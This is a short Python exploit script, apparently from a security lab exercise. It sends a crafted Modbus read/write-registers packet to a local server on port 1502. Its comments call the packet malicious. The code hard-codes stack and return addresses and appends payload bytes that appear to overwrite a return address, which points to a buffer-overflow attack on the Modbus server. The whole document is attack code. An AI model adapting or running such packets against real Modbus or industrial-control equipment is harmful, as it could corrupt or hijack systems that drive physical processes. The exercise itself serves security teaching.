
import socket
import struct
import time
from binascii import * 

HOST = '127.0.0.1'       # The remote host
PORT = 1502              # The same port as used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Establish the connection
s.connect((HOST, PORT))  # Connect to the server 

# Construct the malicious packet you want to send to the server
# Please read about the structure of the modbus packets. You may need the following parameters: tid, pid, length, uid, fcode, write address
# number of registers to write, read address, number of registers to read, and content of the registers to be written (payload)
# Use struct.pack for constructing the packet
transaction = 0x0001
identifier = 0x0000
length = 0x0010
unitid = 0x11
fcode = 0x17  # R/WHolding register fcode.
reg_addr = 0x008a
read_addr=0x0000  # Register address.
count = 0x0006
read_count=0x008d
  # Read three register.
stackp=0xbffff69c
dest=0x8048f30
rsp=0xbffff57c
#req = struct.pack('12B', 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, int(unitId), int(3), 0x00, int(regId), 0xf0, 0x00)
m = struct.pack(
   '>HHHBBHHHH 7B', transaction, identifier, length, unitid, fcode, read_addr, read_count,reg_addr,count,0x06,0x30,0x8f,0x04,0x30,0x8f,0x04)

s.send(m)
BUFFER_SIZE=30
rec = s.recv(BUFFER_SIZE)
print (":".join("{:02x}".format(ord(c)) for c in rec))
